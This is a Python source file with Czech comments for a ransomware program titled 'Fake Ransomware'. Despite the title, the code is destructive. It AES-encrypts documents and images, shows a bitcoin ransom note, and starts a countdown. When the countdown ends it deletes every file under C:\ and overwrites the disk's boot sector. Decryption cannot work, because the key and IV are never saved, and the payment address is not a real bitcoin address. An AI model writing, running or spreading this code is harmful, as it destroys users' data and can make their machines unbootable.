import os
import tkinter as tk
from tkinter import messagebox
import threading
import time
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

# Nastaven칤 spr치vn칠ho kl칤캜e pro de코ifrov치n칤
CORRECT_KEY = "M2sh1jsmMASxhZE390HDi"

# Funkce pro generov치n칤 n치hodn칠ho kl칤캜e a IV
def generate_key_iv():
    key = secrets.token_bytes(32)  # 256-bit kl칤캜 pro AES
    iv = secrets.token_bytes(16)  # 128-bit IV
    return key, iv

# Funkce pro 코ifrov치n칤 dat
def encrypt_data(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Data mus칤 b칳t zarovn치na na bloky 128 bit콢 (16 bajt콢)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Za코ifrujeme data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# Funkce pro 코ifrov치n칤 souboru
def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        original_data = file.read()

    encrypted_data = encrypt_data(original_data, key, iv)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Funkce pro 코ifrov치n칤 v코ech soubor콢 v adres치콏i (v캜etn캩 podslo쬰k)
def encrypt_all_files(directory, key, iv):
    target_extensions = {'.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png'}  # P콏칤pony soubor콢 k 코ifrov치n칤
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_extension = os.path.splitext(file_name)[1].lower()

            # Zpracujeme pouze soubory s c칤lov칳mi p콏칤ponami
            if file_extension in target_extensions:
                try:
                    encrypt_file(file_path, key, iv)
                    print(f"Za코ifrov치no: {file_path}")
                except Exception as e:
                    print(f"Chyba p콏i 코ifrov치n칤 souboru {file_path}: {e}")

# Funkce pro de코ifrov치n칤 dat
def decrypt_data(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # De코ifrujeme data
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Odstran칤me padding
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    original_data = unpadder.update(padded_data) + unpadder.finalize()
    return original_data

# Funkce pro de코ifrov치n칤 souboru
def decrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    decrypted_data = decrypt_data(encrypted_data, key, iv)

    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Funkce pro de코ifrov치n칤 v코ech soubor콢 v adres치콏i (v캜etn캩 podslo쬰k)
def decrypt_all_files(directory, key, iv):
    target_extensions = {'.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png'}  # P콏칤pony soubor콢 k de코ifrov치n칤
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_extension = os.path.splitext(file_name)[1].lower()

            # Zpracujeme pouze soubory s c칤lov칳mi p콏칤ponami
            if file_extension in target_extensions:
                try:
                    decrypt_file(file_path, key, iv)
                    print(f"De코ifrov치no: {file_path}")
                except Exception as e:
                    print(f"Chyba p콏i de코ifrov치n칤 souboru {file_path}: {e}")

# Funkce pro zni캜en칤 syst칠mu
def destroy_system():
    root_dir = "C:\\"
    for root, dirs, files in os.walk(root_dir, topdown=False):
        for name in files:
            try:
                os.remove(os.path.join(root, name))
                print(f"Smaz치n soubor: {os.path.join(root, name)}")
            except Exception as e:
                print(f"Chyba p콏i maz치n칤 souboru: {e}")
        for name in dirs:
            try:
                shutil.rmtree(os.path.join(root, name))
                print(f"Smaz치na slo쬶a: {os.path.join(root, name)}")
            except Exception as e:
                print(f"Chyba p콏i maz치n칤 slo쬶y: {e}")

    try:
        with open("\\\\.\\PhysicalDrive0", "wb") as f:
            f.write(b'\x00' * 512)
            print("Boot sektor p콏eps치n.")
    except Exception as e:
        print(f"Chyba p콏i p콏episov치n칤 boot sektoru: {e}")

# GUI 캜치st
def show_home():
    home_text = "All your files are encrypted. The only way to get your files back is to put a very strong key 游댐 by WhiteLkidd.\n\nGo to this link and pay 0.000012 bitcoins. When payment is done, you will get your key.\n\nSend to this Bitcoin address: 928509e6-1a98-4ffa-ac86-ad7b537dd53e\n\n0.000012 bitcoin"
    text_area.delete(1.0, tk.END)
    text_area.insert(tk.END, home_text)

def show_decrypt():
    decrypt_window = tk.Toplevel(root)
    decrypt_window.title("Decrypt Files")
    decrypt_window.geometry("300x150")
    
    label = tk.Label(decrypt_window, text="Enter the key:")
    label.pack(pady=10)
    
    entry = tk.Entry(decrypt_window)
    entry.pack(pady=10)
    
    submit_button = tk.Button(decrypt_window, text="Submit", command=lambda: check_key(entry.get()))
    submit_button.pack(pady=10)

def check_key(user_key):
    if user_key == CORRECT_KEY:
        messagebox.showinfo("Success", "Correct key! Decrypting files...")
        key, iv = load_key_iv()  # Na캜teme kl칤캜 a IV
        decrypt_all_files(target_directory, key, iv)  # De코ifrujeme soubory
    else:
        messagebox.showerror("Error", "Incorrect key!")

def load_key_iv():
    # Na캜teme kl칤캜 a IV ze souboru (p콏edpokl치d치me, 쬰 byly ulo쬰ny p콏i 코ifrov치n칤)
    with open("encryption_key_iv.bin", "rb") as key_file:
        key_iv = key_file.read()
        key = key_iv[:32]  # Prvn칤ch 32 bajt콢 je kl칤캜
        iv = key_iv[32:48]  # N치sleduj칤c칤ch 16 bajt콢 je IV
    return key, iv

def destroy_pc():
    confirm = messagebox.askyesno("Warning", "This will destroy your PC! Are you sure you want to continue?")
    if confirm:
        messagebox.showwarning("Final Warning", "This action is irreversible. Your system will be destroyed!")
        destroy_system()

def countdown():
    remaining_time = 10  # 10 sekund pro testov치n칤 (zm캩켿te na 259200 pro 3 dny)
    while remaining_time > 0:
        days, remainder = divmod(remaining_time, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_label.config(text=f"Time left: {days}d {hours}h {minutes}m {seconds}s")
        time.sleep(1)
        remaining_time -= 1
    messagebox.showinfo("Time's up!", "The system will now be destroyed!")
    # 말frov치n칤 soubor콢 p콏ed zni캜en칤m syst칠mu
    key, iv = generate_key_iv()
    encrypt_all_files(target_directory, key, iv)
    destroy_system()

# Nastaven칤 adres치콏e
target_directory = os.getcwd()  # Aktu치ln칤 adres치콏 (m콢쬰코 zm캩nit na jin칳)

# Vytvo콏en칤 hlavn칤ho okna
root = tk.Tk()
root.title("Fake Ransomware")
root.geometry("500x400")

# Taby
tabs = tk.Frame(root)
tabs.pack(pady=10)

home_button = tk.Button(tabs, text="Home", command=show_home)
home_button.pack(side=tk.LEFT, padx=5)

decrypt_button = tk.Button(tabs, text="Decrypt Files", command=show_decrypt)
decrypt_button.pack(side=tk.LEFT, padx=5)

destroy_button = tk.Button(tabs, text="Destroy the PC", command=destroy_pc)
destroy_button.pack(side=tk.LEFT, padx=5)

# Odpo캜et
countdown_label = tk.Label(root, text="Time left: 3d 0h 0m 0s", font=("Arial", 12))
countdown_label.pack(pady=10)

# Textov칠 pole
text_area = tk.Text(root, wrap=tk.WORD, height=10, width=50)
text_area.pack(pady=10)

# Spu코t캩n칤 odpo캜tu v samostatn칠m vl치kn캩
countdown_thread = threading.Thread(target=countdown)
countdown_thread.daemon = True
countdown_thread.start()

# Spu코t캩n칤 hlavn칤 smy캜ky
root.mainloop()
